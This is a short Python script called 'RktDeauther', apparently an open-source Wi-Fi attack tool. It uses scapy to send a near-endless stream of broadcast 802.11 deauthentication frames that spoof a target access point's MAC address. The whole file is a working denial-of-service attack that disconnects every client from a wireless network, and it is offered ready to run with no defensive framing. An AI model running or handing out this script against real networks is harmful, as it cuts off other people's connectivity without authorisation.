import os
import sys
from scapy.all import *
import pyfiglet

banner=pyfiglet.figlet_format('RktDeauther',font = 'standard')

print(banner)

print("          Author : Rahat Khan Tusar(rkt)")
print("          Github : https://github.com/r3k4t")
print
interface = raw_input("Enter your linux interface(Example:wlp2s0mon,wlan0mon etc) : ")

brdmac= "ff:ff:ff:ff:ff:ff"

pkt = RadioTap() /Dot11(addr1 = brdmac, addr2 =sys.argv[1],addr3=sys.argv[1]) / Dot11Deauth()

sendp(pkt,iface = interface,count = 100000000000000000000000000000000000,inter=.2)



